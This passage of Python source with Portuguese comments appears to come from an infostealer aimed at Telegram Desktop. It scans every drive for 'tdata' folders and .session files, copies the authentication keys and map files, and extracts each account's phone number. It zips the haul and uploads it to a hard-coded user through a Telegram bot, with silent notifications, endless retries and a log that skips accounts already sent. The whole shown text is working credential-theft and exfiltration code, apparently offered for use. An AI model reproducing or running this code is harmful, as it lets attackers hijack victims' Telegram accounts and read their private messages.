                            print(f"***AVISO: Arquivo {arquivo} no zip está vazio")
                        total_size += info.file_size
                    except:
                        pass
                
                if total_size == 0:
                    print(f"***ERRO CRÍTICO: Todos os arquivos no zip estão vazios!")
                    raise Exception("Zip sem conteúdo")
                
                print(f"***OK Zip válido e íntegro - {len(arquivos_no_zip)} arquivo(s), {total_size} bytes totais")
                
                # VALIDAÇÃO FINAL: Lê todos os arquivos para garantir que podem ser lidos corretamente
                print(f"***Validação final de integridade: lendo todos os arquivos do ZIP...")
                for arquivo_zip in arquivos_no_zip:
                    try:
                        dados_lidos = zip_test.read(arquivo_zip)
                        info_arquivo = zip_test.getinfo(arquivo_zip)
                        if len(dados_lidos) != info_arquivo.file_size:
                            print(f"***ERRO CRÍTICO: Arquivo {arquivo_zip} corrompido no ZIP!")
                            print(f"***  Esperado: {info_arquivo.file_size} bytes")
                            print(f"***  Lido: {len(dados_lidos)} bytes")
                            raise Exception(f"Arquivo {arquivo_zip} corrompido no ZIP")
                    except Exception as e:
                        if "corrompido" not in str(e):
                            print(f"***ERRO CRÍTICO: Não foi possível ler {arquivo_zip} do ZIP: {repr(e)}")
                        raise
                
                print(f"***OK Todos os arquivos do ZIP foram lidos e validados - INTEGRIDADE TOTAL GARANTIDA")
        except Exception as e:
            print(f"***ERRO CRÍTICO: Zip corrompido após criação: {repr(e)}")
            raise
        
        # Verifica tamanho do arquivo
        zip_size = os.path.getsize(zip_path) if os.path.exists(zip_path) else 0
        zip_size_mb = zip_size / (1024 * 1024)
        print(f"***Zip size: {zip_size_mb:.2f} MB")
        
        # NÃO DIVIDE - faz esforço para enviar inteiro SEM LIMITE DE TIMEOUT
        print(f"***Enviando arquivo completo ({zip_size_mb:.2f} MB) - garantindo sucesso...")
        
        # Verifica limite do Telegram (50MB)
        limite_telegram_mb = 50
        limite_telegram_bytes = limite_telegram_mb * 1024 * 1024  # 50MB em bytes
        
        # Se arquivo > 50MB, divide em partes que podem ser reconstruídas
        if zip_size_mb > limite_telegram_mb:
            print(f"***Arquivo ({zip_size_mb:.2f}MB) excede limite do Telegram ({limite_telegram_mb}MB)")
            print(f"***Dividindo em partes de {limite_telegram_mb}MB (sem corrupção - pode ser reconstruído)...")
            
            # Divide o arquivo em partes binárias
            partes = dividir_arquivo_em_partes(zip_path, limite_telegram_bytes, conjunto_num)
            
            if len(partes) > 1:
                print(f"***Arquivo dividido em {len(partes)} partes para envio")
                enviado = enviar_partes(partes, conjunto_num, version, path_info, tdata_dest, json_copiados, session_copiados, zip_size_mb)
                
                # Limpa partes temporárias após envio
                if enviado:
                    for parte in partes:
                        try:
                            if os.path.exists(parte):
                                os.remove(parte)
                        except:
                            pass
                
                # Limpa arquivo original
                if enviado:
                    try:
                        os.remove(zip_path)
                        shutil.rmtree(conjunto_temp)
                    except:
                        pass
                return
            
            # Se divisão falhou, tenta enviar inteiro mesmo assim
            print(f"***Divisão falhou, tentando enviar arquivo completo mesmo assim...")
        
        enviado = False
        path_info = telegram_dir if telegram_dir else (tdata_path if tdata_path else "Isolado")
        
        # Timeout máximo absoluto (7 dias - máximo que a API aceita)
        timeout_maximo = 86400 * 7  # 604800 segundos = 7 dias
        
        tentativa = 0
        while not enviado:
            tentativa += 1
            try:
                if tentativa > 1:
                    # Backoff exponencial para estabilizar conexão
                    wait_time = min(30 * (2 ** (tentativa - 2)), 600)  # Exponencial até 10 minutos
                    print(f"***Retry {tentativa} para conjunto {conjunto_num} (aguardando {wait_time}s para estabilizar conexão)...")
                    time.sleep(wait_time)
                
                print(f"***Tentativa {tentativa}: Enviando {zip_size_mb:.2f}MB (timeout: {timeout_maximo/3600:.1f} horas)")
                
                # Verifica se há outros envios na fila
                tamanho_fila = fila_envios.qsize()
                if tamanho_fila > 0 or enviando:
                    print(f"***Aguardando na fila... ({tamanho_fila} envio(s) à frente)")
                
                # Função interna para envio (será enfileirada)
                def fazer_envio():
                    # Valida arquivo antes de enviar
                    if not os.path.exists(zip_path):
                        raise FileNotFoundError(f"Arquivo zip não encontrado: {zip_path}")
                    
                    tamanho_real = os.path.getsize(zip_path)
                    if abs(tamanho_real - zip_size_mb * 1024 * 1024) > 1024:  # Tolerância de 1KB
                        print(f"***AVISO: Tamanho do arquivo mudou: esperado {zip_size_mb:.2f}MB, atual {tamanho_real / (1024*1024):.2f}MB")
                    
                    # Abre arquivo em modo binário e envia
                    # IMPORTANTE: Não usa 'with' aqui para garantir que o arquivo não seja fechado antes do envio
                    zip_file = open(zip_path, 'rb')
                    try:
                        bot.send_document(
                            user_id,
                            zip_file,
                            caption=f"Conjunto {conjunto_num}\nVersion: {version}\nPath: {path_info}\n📁 APENAS arquivos de autenticação da tdata\nSize: {zip_size_mb:.2f}MB",
                            timeout=timeout_maximo,
                            disable_notification=True,
                            disable_content_type_detection=False
                        )
                    finally:
                        zip_file.close()
                
                # Adiciona à fila e espera conclusão
                resultado_envio = {'sucesso': False, 'erro': None}
                evento_conclusao = threading.Event()
                
                def envio_com_callback():
                    try:
                        fazer_envio()
                        resultado_envio['sucesso'] = True
                    except Exception as e:
                        resultado_envio['erro'] = e
                    finally:
                        evento_conclusao.set()
                
                # Adiciona à fila
                fila_envios.put((envio_com_callback, (), {}))
                
                # Espera conclusão (com timeout de segurança)
                if evento_conclusao.wait(timeout=timeout_maximo + 60):
                    if resultado_envio['sucesso']:
                        enviado = True
                        print(f"***OK Conjunto {conjunto_num} enviado com sucesso (arquivo completo)")
                        break
                    else:
                        # Re-lança o erro para tratamento normal
                        if resultado_envio['erro']:
                            error_str_upload = str(resultado_envio['erro'])
                            if 'file too large' in error_str_upload.lower() or '413' in error_str_upload:
                                print(f"***ERRO: Arquivo muito grande para Telegram API (limite 50MB)")
                                print(f"***Arquivo tem {zip_size_mb:.2f}MB - precisa ser dividido ou usar método alternativo")
                                break
                            raise resultado_envio['erro']
                else:
                    raise TimeoutError("Timeout aguardando processamento da fila")
                    
            except ConnectionError as e:
                # Erro de conexão - backoff exponencial
                wait_connection = min(60 * (2 ** (tentativa - 1)), 600)  # Exponencial até 10 minutos
                print(f"***Connection error (tentativa {tentativa}), aguardando {wait_connection}s (backoff exponencial)...")
                time.sleep(wait_connection)
                # Continua no loop (nunca desiste)
                        
            except Exception as e:
                # Qualquer erro - continua tentando indefinidamente até conseguir
                error_str = str(e)
                if 'timeout' in error_str.lower() or 'timed out' in error_str.lower():
                    wait_time = min(60 * (2 ** (tentativa - 1)), 600)  # Backoff exponencial
                    print(f"***Timeout detectado (tentativa {tentativa}), aguardando {wait_time}s (backoff exponencial)...")
                    time.sleep(wait_time)
                    # Continua no loop (nunca desiste)
                elif 'connection' in error_str.lower() or 'reset' in error_str.lower() or 'aborted' in error_str.lower():
                    wait_connection = min(90 * (2 ** (tentativa - 1)), 900)  # Backoff exponencial até 15 minutos
                    print(f"***Connection reset (tentativa {tentativa}), aguardando {wait_connection}s (backoff exponencial)...")
                    time.sleep(wait_connection)
                    # Continua no loop (nunca desiste)
                elif '413' in error_str or 'file too large' in error_str.lower():
                    print(f"***ERRO CRÍTICO: Arquivo muito grande ({zip_size_mb:.2f}MB) - Telegram não aceita arquivos > 50MB")
                    print(f"***Arquivo mantido em: {zip_path}")
                    break
                else:
                    wait_error = min(30 * (2 ** (tentativa - 1)), 300)  # Backoff exponencial
                    print(f"***Erro (tentativa {tentativa}): {error_str[:100]}, aguardando {wait_error}s (backoff exponencial)...")
                    time.sleep(wait_error)
                    # Continua no loop (nunca desiste)
        
        # Limpa arquivo temporário apenas se foi enviado com sucesso
        if enviado:
            remover_arquivo_temp(zip_path)
            remover_arquivo_temp(conjunto_temp)
        else:
            # Se não conseguiu enviar, mantém o arquivo para possível retry manual
            print(f"***Warning: Arquivo mantido em {zip_path} para possível retry manual")
            # Remove apenas pasta temporária, mantém zip
            remover_arquivo_temp(conjunto_temp)
            
    except Exception as e:
        print(f"ERROR creating zip for conjunto {conjunto_num}: {repr(e)}")
        remover_arquivo_temp(zip_path)
        remover_arquivo_temp(conjunto_temp)

def copiar_tdata_completo_para_temp(src_tdata, conjunto_id):
    """
    Copia a pasta tdata COMPLETA para um local temporário.
    Retorna o caminho da cópia ou None se falhar.
    """
    import time
    
    # Cria diretório temporário para a cópia do tdata
    tdata_temp = os.path.join(temp, f'tdata_temp_{conjunto_id}')
    registrar_arquivo_temp(tdata_temp)
    
    try:
        # Remove cópia anterior se existir
        if os.path.exists(tdata_temp):
            try:
                shutil.rmtree(tdata_temp)
            except:
                pass
        
        print(f"***Copiando pasta tdata COMPLETA para local temporário: {tdata_temp}")
        print(f"***Origem: {src_tdata}")
        
        # Copia pasta tdata completa usando método robusto
        sucesso, falhas, bloqueados = copia_tdata_ignorando_bloqueados(src_tdata, tdata_temp)
        
        print(f"***Cópia tdata completa: {sucesso} arquivo(s) copiado(s), {falhas} falha(s), {len(bloqueados)} bloqueado(s)")
        
        if sucesso > 0:
            # Valida que a cópia tem conteúdo
            try:
                arquivos_copiados = []
                for root, dirs, files in os.walk(tdata_temp):
                    for file in files:
                        arquivos_copiados.append(os.path.join(root, file))
                
                if len(arquivos_copiados) > 0:
                    print(f"***OK Cópia tdata criada com {len(arquivos_copiados)} arquivo(s)")
                    return tdata_temp
                else:
                    print(f"***ERRO: Cópia tdata está vazia!")
                    try:
                        shutil.rmtree(tdata_temp)
                    except:
                        pass
                    return None
            except Exception as e:
                print(f"***ERRO ao validar cópia tdata: {repr(e)}")
                return None
        else:
            print(f"***ERRO: Nenhum arquivo foi copiado da pasta tdata!")
            try:
                shutil.rmtree(tdata_temp)
            except:
                pass
            return None
            
    except Exception as e:
        print(f"***ERRO ao copiar tdata para temp: {repr(e)}")
        import traceback
        traceback.print_exc()
        try:
            if os.path.exists(tdata_temp):
                shutil.rmtree(tdata_temp)
        except:
            pass
        return None

def send_session_files(tdata_path, telegram_dir=None):
    """
    Copia APENAS os arquivos essenciais da pasta tdata, coloca em um zip sem compactar
    e envia.
    Arquivos essenciais: key_datas, map/map0/map1, settings/settings0, pasta D877F783D5D3EF8C*
    """
    # Se telegram_dir não foi fornecido, tenta encontrar
    if telegram_dir is None:
        if tdata_path:
            telegram_dir = verifica_telegram_exe(tdata_path)
            if telegram_dir is None:
                # Se não encontrou Telegram.exe, ainda pode processar se tiver tdata
                if os.path.exists(tdata_path) and os.path.basename(tdata_path) == 'tdata':
                    telegram_dir = os.path.dirname(tdata_path)
                else:
                    telegram_dir = None
        else:
            telegram_dir = None
    
    # Garante que tdata_path é válido
    if tdata_path:
        if os.path.basename(tdata_path) != 'tdata':
            tdata_path_candidate = os.path.join(telegram_dir, 'tdata') if telegram_dir else None
            if tdata_path_candidate and os.path.exists(tdata_path_candidate):
                tdata_path = tdata_path_candidate
            elif not os.path.exists(tdata_path):
                tdata_path = None
        elif not os.path.exists(tdata_path):
            tdata_path = None
    else:
        # Se não tem tdata_path, tenta encontrar
        if telegram_dir:
            tdata_candidate = os.path.join(telegram_dir, 'tdata')
            if os.path.exists(tdata_candidate):
                tdata_path = tdata_candidate
    
        # Se não tem tdata, não pode gerar session
    if not tdata_path or not os.path.exists(tdata_path):
        print(f"***ERRO: Pasta tdata não encontrada para gerar arquivo .session")
        return False
    
    print(f"***Usando pasta tdata para gerar arquivo .session: {tdata_path}")
    
    # Tenta extrair número da conta do Telegram
    numero_conta_final = extrair_numero_conta_telegram(tdata_path)
    
    # Se encontrou número da conta, usa o número completo (apenas dígitos), senão usa hash
    if numero_conta_final:
        try:
            # Remove qualquer caractere não numérico para garantir apenas dígitos
            import re
            numero_limpo = re.sub(r'\D', '', str(numero_conta_final))  # Remove tudo que não é dígito
            if numero_limpo and len(numero_limpo) >= 8:
                conjunto_id = numero_limpo  # Usa o número completo (apenas dígitos)
                print(f"***Usando número completo da conta no nome do arquivo: {conjunto_id}")
            else:
                raise ValueError("Número inválido após limpeza")
        except:
            conjunto_id = abs(hash(telegram_dir if telegram_dir else (tdata_path if tdata_path else "isolado"))) % 10000
    else:
        conjunto_id = abs(hash(telegram_dir if telegram_dir else (tdata_path if tdata_path else "isolado"))) % 10000
        print(f"***Número da conta não encontrado, usando hash: {conjunto_id}")
    
    # PASSO 1: Copia APENAS arquivos essenciais da tdata para local temporário
    print(f"***PASSO 1: Copiando TODOS os arquivos de autenticação da pasta tdata...")
    print(f"***Arquivos de autenticação: key_data/key_datas, map/map0/map1, settings/settings0, config/configs, data/datas, auth/auth_data, pasta D877F783D5D3EF8C*, e TODOS os arquivos contendo key/auth/data/config/session/account/user")
    
    # Cria diretório temporário para este conjunto
    conjunto_temp = os.path.join(temp, f"conjunto_{conjunto_id}")
    registrar_arquivo_temp(conjunto_temp)
    os.makedirs(conjunto_temp, exist_ok=True)
    
    tdata_dest = os.path.join(conjunto_temp, "tdata")
    try:
        if os.path.exists(tdata_dest):
            shutil.rmtree(tdata_dest)
    except:
        pass
    
    os.makedirs(tdata_dest, exist_ok=True)
    
    # Copia TODOS os arquivos de autenticação
    sucesso, falhas, bloqueados = copiar_tdata_essenciais(tdata_path, tdata_dest)
    print(f"***OK TODOS os arquivos de autenticação copiados: {sucesso} arquivo(s) com sucesso, {falhas} falha(s), {len(bloqueados)} bloqueado(s)")
    
    if sucesso == 0:
        print(f"***ERRO: Nenhum arquivo essencial foi copiado! A sessão pode não funcionar.")
        try:
            shutil.rmtree(conjunto_temp)
        except:
            pass
        return False
    
    # PASSO 2: Cria ZIP com arquivos essenciais SEM COMPACTAÇÃO
    zip_path = os.path.join(temp, f'tdata_conjunto_{conjunto_id}.zip')
    registrar_arquivo_temp(zip_path)
    
    try:
        print(f"***PASSO 2: Criando ZIP com ZERO compressão (ZIP_STORED) para garantir integridade...")
        
        arquivos_adicionados = set()  # Controla arquivos já adicionados para evitar duplicatas
        
        with ZipFile(zip_path, 'w', compression=ZIP_STORED) as zipObj:  # ZERO COMPRESSÃO - apenas armazenamento
            # Adiciona pasta tdata com arquivos essenciais
            if tdata_dest and os.path.exists(tdata_dest):
                arquivos_tdata_adicionados = 0
                for folderName, subfolders, filenames in os.walk(tdata_dest):
                    for filename in filenames:
                        filePath = os.path.join(folderName, filename)
                        try:
                            # Valida arquivo antes de adicionar
                            if not os.path.exists(filePath):
                                continue
                            
                            # Obtém tamanho original
                            tamanho_original = os.path.getsize(filePath)
                            if tamanho_original == 0:
                                print(f"***AVISO: Arquivo vazio ignorado: {filename}")
                                continue
                            
                            # Calcula caminho relativo para o ZIP
                            arcname = os.path.relpath(filePath, conjunto_temp)
                            
                            # Verifica se já foi adicionado (evita duplicatas)
                            if arcname not in arquivos_adicionados:
                                # Lê arquivo em memória para garantir integridade
                                with open(filePath, 'rb') as f:
                                    file_data = f.read()
                                
                                # Verifica se tamanho confere
                                if len(file_data) != tamanho_original:
                                    print(f"***AVISO: Tamanho do arquivo lido não confere: {filename}")
                                    continue
                                
                                # Adiciona ao ZIP
                                zipObj.writestr(arcname, file_data)
                                arquivos_adicionados.add(arcname)
                                arquivos_tdata_adicionados += 1
                                
                                # Valida dentro do ZIP
                                if arcname in zipObj.namelist():
                                    info_zip = zipObj.getinfo(arcname)
                                    if info_zip.file_size == tamanho_original:
                                        print(f"***OK Arquivo adicionado ao ZIP: {arcname} ({tamanho_original} bytes)")
                                    else:
                                        print(f"***AVISO: Tamanho no ZIP não confere para {arcname}")
                                else:
                                    print(f"***AVISO: Arquivo não encontrado no ZIP após adicionar: {arcname}")
                        except Exception as e:
                            print(f"***ERRO ao adicionar {filename} ao ZIP: {repr(e)}")
                            continue
                
                print(f"***OK Total de arquivos tdata adicionados ao ZIP: {arquivos_tdata_adicionados}")
            
            # Adiciona arquivo com informações da conta
            try:
                import re
                numero_limpo = None
                if numero_conta_final:
                    numero_limpo = re.sub(r'\D', '', str(numero_conta_final))
                    if numero_limpo and len(numero_limpo) >= 8:
                        print(f"***Número completo da conta encontrado: {numero_limpo}")
                    else:
                        numero_limpo = None
                
                # Cria arquivo de texto com o número completo (ou indica se não encontrado)
                if numero_limpo:
                    info_conta = f"NUMERO_CONTA: {numero_limpo}\n"
                    info_conta += f"CONJUNTO_ID: {conjunto_id}\n"
                    info_conta += f"TDATA_PATH: {tdata_path}\n"
                    info_conta += f"STATUS: NUMERO_ENCONTRADO\n"
                else:
                    info_conta = f"NUMERO_CONTA: NAO_ENCONTRADO\n"
                    info_conta += f"CONJUNTO_ID: {conjunto_id}\n"
                    info_conta += f"TDATA_PATH: {tdata_path}\n"
                    info_conta += f"STATUS: NUMERO_NAO_ENCONTRADO\n"
                
                # Adiciona conta_info.txt ao ZIP
                zipObj.writestr("conta_info.txt", info_conta.encode('utf-8'))
                
                if "conta_info.txt" in zipObj.namelist():
                    print(f"***OK conta_info.txt adicionado ao zip com sucesso")
                    if numero_limpo:
                        print(f"***Número completo da conta no zip: {numero_limpo}")
                    else:
                        print(f"***AVISO: Número da conta não encontrado, mas conta_info.txt foi criado")
                else:
                    print(f"***ERRO: conta_info.txt não foi adicionado ao zip!")
            except Exception as e:
                print(f"***ERRO ao adicionar número da conta ao zip: {repr(e)}")
                import traceback
                traceback.print_exc()
            
            # Valida integridade final do ZIP
            print(f"***Validando integridade completa do zip...")
            total_arquivos = len(zipObj.namelist())
            print(f"***OK Total de arquivos no ZIP: {total_arquivos}")
            
            # Valida cada arquivo dentro do ZIP
            for arquivo_zip in zipObj.namelist():
                try:
                    info_arquivo = zipObj.getinfo(arquivo_zip)
                    if info_arquivo.file_size == 0 and arquivo_zip != "conta_info.txt":
                        print(f"***AVISO: Arquivo vazio no ZIP: {arquivo_zip}")
                    else:
                        print(f"***OK Arquivo no zip: {arquivo_zip} ({info_arquivo.file_size} bytes)")
                except Exception as e:
                    print(f"***ERRO ao validar arquivo {arquivo_zip} no ZIP: {repr(e)}")
        
        # Valida tamanho final do ZIP
        zip_size = os.path.getsize(zip_path)
        print(f"***OK ZIP criado com sucesso: {zip_size} bytes ({zip_size / 1024:.2f} KB)")
        
        if zip_size == 0:
            print(f"***ERRO: ZIP criado está vazio!")
            remover_arquivo_temp(zip_path)
            try:
                shutil.rmtree(conjunto_temp)
            except:
                pass
            return False
        
        # Limpa diretório temporário
        try:
            shutil.rmtree(conjunto_temp)
        except:
            pass
        
        # PASSO 3: Envia ZIP
        print(f"***PASSO 3: Enviando ZIP com arquivos essenciais da tdata...")
        try:
            zip_size_mb = zip_size / (1024 * 1024)
            enviar_zip_session(zip_path, conjunto_id, telegram_dir, None, zip_size_mb)
            print(f"***OK ZIP com arquivos essenciais da tdata enviado com sucesso")
            remover_arquivo_temp(zip_path)
            return True
        except Exception as e:
            print(f"***ERRO ao enviar ZIP: {repr(e)}")
            import traceback
            traceback.print_exc()
            remover_arquivo_temp(zip_path)
            return False
            
    except Exception as e:
        print(f"***ERRO ao criar ZIP: {repr(e)}")
        import traceback
        traceback.print_exc()
        try:
            shutil.rmtree(conjunto_temp)
        except:
            pass
        remover_arquivo_temp(zip_path)
        return False



# Busca recursiva para encontrar TODOS os conjuntos tdata em QUALQUER lugar
# Coleta todos os conjuntos e processa separadamente
encontradas = []
conjuntos_processados = set()  # Para evitar processar o mesmo conjunto duas vezes

# Sistema persistente para evitar envios duplicados
# arquivos_enviados_file = os.path.join(temp, 'telegram_enviados.json')

def carregar_arquivos_enviados():
    """Carrega lista de arquivos já enviados (persistente)."""
    if os.path.exists(arquivos_enviados_file):
        try:
            with open(arquivos_enviados_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def salvar_arquivo_enviado(identificador, tdata_path=None, session_path=None):
    """Salva identificador de arquivo já enviado (persistente)."""
    try:
        enviados = carregar_arquivos_enviados()
        enviados[identificador] = {
            'tdata_path': tdata_path,
            'session_path': session_path,
            'timestamp': time.time(),
            'data_hora': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
        }
        
        # Garante que o diretório existe
        os.makedirs(os.path.dirname(arquivos_enviados_file), exist_ok=True)
        
        # Salva com múltiplas tentativas
        for tentativa in range(3):
            try:
                with open(arquivos_enviados_file, 'w', encoding='utf-8') as f:
                    json.dump(enviados, f, indent=2, ensure_ascii=False)
                
                # Verifica se foi salvo corretamente
                if os.path.exists(arquivos_enviados_file):
                    tamanho = os.path.getsize(arquivos_enviados_file)
                    if tamanho > 0:
                        print(f"***OK Informações salvas em {arquivos_enviados_file} ({tamanho} bytes)")
                        return True
                
                if tentativa < 2:
                    time.sleep(0.1)
                    continue
            except Exception as e:
                print(f"***ERRO ao salvar arquivo enviado (tentativa {tentativa + 1}): {repr(e)}")
                if tentativa < 2:
                    time.sleep(0.1)
                    continue
                else:
                    print(f"***ERRO CRÍTICO: Não foi possível salvar informações do arquivo enviado!")
                    return False
        
        return False
    except Exception as e:
        print(f"***ERRO CRÍTICO ao salvar arquivo enviado: {repr(e)}")
        import traceback
        traceback.print_exc()
        return False

def ja_foi_enviado(identificador):
    """Verifica se um arquivo já foi enviado."""
    enviados = carregar_arquivos_enviados()
    return identificador in enviados

def obter_identificador_unico(tdata_path=None, session_path=None, numero_conta=None):
    """Gera identificador único para um conjunto/sessão."""
    # Prioriza número da conta (mais confiável)
    if numero_conta:
        import re
        numero_limpo = re.sub(r'\D', '', str(numero_conta))
        if numero_limpo and len(numero_limpo) >= 8:
            return f"conta_{numero_limpo}"
    
    # Se tem tdata, usa hash do path normalizado
    if tdata_path:
        path_normalizado = os.path.normpath(tdata_path).lower()
        import hashlib
        hash_path = hashlib.md5(path_normalizado.encode('utf-8')).hexdigest()[:16]
        return f"tdata_{hash_path}"
    
    # Se tem session, usa hash do path normalizado
    if session_path:
        path_normalizado = os.path.normpath(session_path).lower()
        import hashlib
        hash_path = hashlib.md5(path_normalizado.encode('utf-8')).hexdigest()[:16]
        return f"session_{hash_path}"
    
    return None

# Diretórios a ignorar na busca (APENAS os críticos do sistema - mínimo necessário)
# Removidos: node_modules, .git, venv, __pycache__ - podem conter tdata!
ignorar_dirs = [
    'system volume information',  # Protegido pelo Windows
    '$recycle.bin',  # Lixeira
    'recovery',  # Partição de recuperação
    'perflogs',  # Logs de performance do Windows
    # NÃO ignorar: windows, system32, syswow64, programdata - podem ter Telegram instalado!
]

def processar_conjunto_imediato(tdata_path):
    """Processa e envia APENAS arquivos de sessão quando encontrado."""
    if tdata_path in encontradas:
        return False
    
    # Tenta encontrar Telegram.exe, mas processa mesmo se não encontrar
    telegram_dir = verifica_telegram_exe(tdata_path)
    if not telegram_dir:
        # Se não encontrou Telegram.exe, usa o diretório do tdata
        if os.path.basename(tdata_path) == 'tdata':
            telegram_dir = os.path.dirname(tdata_path)
        else:
            telegram_dir = tdata_path
    
    # Tenta extrair número da conta para usar como identificador único
    numero_conta = None
    try:
        numero_conta = extrair_numero_conta_telegram(tdata_path)
    except:
        pass
    
    # Gera identificador único (prioriza número da conta)
    identificador = obter_identificador_unico(tdata_path=tdata_path, numero_conta=numero_conta)
    
    # Verifica se já foi enviado (persistente)
    if identificador and ja_foi_enviado(identificador):
        print(f"***AVISO: Conjunto já foi enviado anteriormente (ignorando): {tdata_path}")
        return False
    
    conjunto_id = (telegram_dir, tdata_path)
    if conjunto_id not in conjuntos_processados:
        conjuntos_processados.add(conjunto_id)
        encontradas.append(tdata_path)
        # Processa e envia APENAS arquivos de sessão (mesmo se tdata estiver em uso)
        print(f"***Processando conjunto encontrado: {tdata_path}")
        print(f"***Telegram.exe encontrado: {'SIM' if verifica_telegram_exe(tdata_path) else 'NÃO (processando mesmo assim)'}")
        print(f"***Gerando arquivo .session a partir do tdata...")
        print(f"***IMPORTANTE: Todas as pastas tdata geram session para enviar")
        
        # Delay antes de processar (evita sobrecarga)
        time.sleep(2)
        
        # Processa e envia
        try:
            print(f"***Chamando send_session_files para: {tdata_path}")
            resultado = send_session_files(tdata_path, telegram_dir)
            print(f"***Resultado do processamento: {resultado}")
        except Exception as e:
            print(f"***ERRO ao processar conjunto: {repr(e)}")
            import traceback
            traceback.print_exc()
            resultado = False
        
        # Se enviou com sucesso, marca como enviado
        if resultado and identificador:
            try:
                salvar_arquivo_enviado(identificador, tdata_path=tdata_path)
                print(f"***Conjunto marcado como enviado: {identificador}")
            except Exception as e:
                print(f"***ERRO ao salvar arquivo enviado: {repr(e)}")
        
        # Delay após processar (evita sobrecarga)
        time.sleep(2)
        
        return resultado if resultado else False
    return False

def processar_session_isolado(session_path):
    """Processa um arquivo .session isolado encontrado."""
    if session_path in encontradas:
        return False
    
    # Tenta extrair número da conta do arquivo .session
    numero_conta = None
    try:
        numero_conta = extrair_numero_conta_telegram(session_path)
    except:
        pass
    
    # Gera identificador único (prioriza número da conta)
    identificador = obter_identificador_unico(session_path=session_path, numero_conta=numero_conta)
    
    # Verifica se já foi enviado (persistente)
    if identificador and ja_foi_enviado(identificador):
        print(f"***AVISO: Session já foi enviada anteriormente (ignorando): {session_path}")
        return False
    
    conjunto_id = f"session_isolado_{session_path}"
    if conjunto_id not in conjuntos_processados:
        conjuntos_processados.add(conjunto_id)
        encontradas.append(session_path)
        
        print(f"***Arquivo .session isolado encontrado: {session_path}")
        
        # Tenta encontrar Telegram.exe próximo
        telegram_dir = None
        session_dir = os.path.dirname(session_path)
        if verifica_telegram_exe(session_dir):
            telegram_dir = verifica_telegram_exe(session_dir)
        
        # Tenta extrair número da conta do arquivo .session (múltiplas tentativas)
        numero_conta_final = None
        try:
            # Tenta ler o arquivo .session para encontrar número da conta (lê mais dados)
            metodos_leitura = [
                lambda: open(session_path, 'rb').read(32768),  # 32KB
                lambda: copiar_arquivo_compartilhado_leitura(session_path, 32768),
                lambda: copiar_arquivo_ctypes_leitura(session_path, 32768),
                lambda: open(session_path, 'rb').read(8192),  # Fallback menor
            ]
            
            dados_session = None
            for metodo in metodos_leitura:
                try:
                    dados_session = metodo()
                    if dados_session and len(dados_session) > 0:
                        break
                except:
                    continue
            
            if dados_session:
                import re
                # Procura números no conteúdo do arquivo (sem limite superior)
                dados_str = dados_session.decode('utf-8', errors='ignore') + dados_session.decode('latin-1', errors='ignore')
                
                # Múltiplos padrões para encontrar número da conta
                padroes = [
                    r'\b\d{8,}\b',  # Números de 8+ dígitos
                    r'phone["\']?\s*[:=]\s*["\']?(\d{8,})',  # JSON com phone
                    r'user_id["\']?\s*[:=]\s*["\']?(\d{8,})',  # user_id
                    r'id["\']?\s*[:=]\s*["\']?(\d{8,})',  # id genérico
                ]
                
                for padrao in padroes:
                    matches = re.findall(padrao, dados_str)
                    if matches:
                        for match in matches:
                            num_str = match if isinstance(match, str) else str(match)
                            try:
                                num = int(num_str)
                                if num > 10000000:  # Números de conta válidos são grandes
                                    numero_conta_final = str(num)  # Número completo
                                    print(f"***Número completo da conta encontrado no .session: {numero_conta_final}")
                                    break
                            except:
                                continue
                        if numero_conta_final:
                            break
        except Exception as e:
            print(f"***AVISO: Erro ao extrair número do .session: {repr(e)}")
            pass
        
        # Se encontrou número da conta, usa o número completo (apenas dígitos), senão usa hash
        if numero_conta_final:
            try:
                # Remove qualquer caractere não numérico para garantir apenas dígitos
                import re
                numero_limpo = re.sub(r'\D', '', str(numero_conta_final))  # Remove tudo que não é dígito
                if numero_limpo and len(numero_limpo) >= 8:
                    conjunto_num = numero_limpo  # Usa o número completo (apenas dígitos)
                    print(f"***Usando número completo da conta no nome do arquivo: {conjunto_num}")
                else:
                    raise ValueError("Número inválido após limpeza")
            except:
                conjunto_num = abs(hash(session_path)) % 10000
        else:
            conjunto_num = abs(hash(session_path)) % 10000
        
        session_name = os.path.basename(session_path)
        
        # VALIDAÇÃO COMPLETA DA SESSÃO ISOLADA ANTES DE ENVIAR
        print(f"***Validando INTEGRIDADE COMPLETA da sessão isolada antes de enviar...")
        
        # VALIDAÇÃO 1: Verifica se arquivo existe e tem tamanho válido
        if not os.path.exists(session_path):
            print(f"***ERRO: Arquivo .session não existe: {session_path}")
            return False
        
        # Verifica permissão de leitura
        try:
            if not os.access(session_path, os.R_OK):
                print(f"***ERRO: Arquivo .session não tem permissão de leitura: {session_path}")
                return False
            print(f"***OK Arquivo .session tem permissão de leitura")
        except Exception as e:
            print(f"***AVISO: Não foi possível verificar permissão de leitura: {repr(e)}")
            # Tenta mesmo assim, pode ser que funcione
        
        # Tenta abrir o arquivo para leitura para confirmar permissão
        try:
            with open(session_path, 'rb') as test_file:
                test_file.read(1)  # Tenta ler pelo menos 1 byte
            print(f"***OK Arquivo .session pode ser lido")
        except PermissionError:
            print(f"***ERRO: Sem permissão para ler arquivo .session: {session_path}")
            return False
        except Exception as e:
            print(f"***AVISO: Erro ao tentar ler arquivo .session: {repr(e)}")
            # Continua mesmo assim, pode ser erro temporário
        
        session_size = os.path.getsize(session_path)
        if session_size == 0:
            print(f"***ERRO: Arquivo .session está vazio!")
            return False
        
        print(f"***OK Arquivo .session existe: {session_size} bytes")
        
        # Para arquivos session_conjunto, garante que não há conexões abertas antes de validar
        if 'session_conjunto_' in os.path.basename(session_path):
            try:
                # Tenta fechar qualquer conexão SQLite que possa estar aberta
                conn_temp = sqlite3.connect(session_path, timeout=0.5)
                conn_temp.close()
                # Pequeno delay para garantir que o arquivo foi liberado
                time.sleep(0.2)
                print(f"***Conexões SQLite fechadas antes de validar session_conjunto")
            except:
                # Se não conseguir conectar, pode ser que não seja SQLite ou já está fechado
                pass
        
        # VALIDAÇÃO 2: Se for SQLite, valida integridade
        try:
            # Tenta conectar como SQLite
            conn_integrity = sqlite3.connect(session_path, timeout=5.0)
            cursor_integrity = conn_integrity.cursor()
            
            # Verifica integridade do banco
            cursor_integrity.execute("PRAGMA integrity_check")
            integrity_result = cursor_integrity.fetchone()
            
            if integrity_result and integrity_result[0] == 'ok':
                print(f"***OK Integridade SQLite validada")
            else:
                print(f"***ERRO: Arquivo SQLite corrompido: {integrity_result}")
                conn_integrity.close()
                return False
            
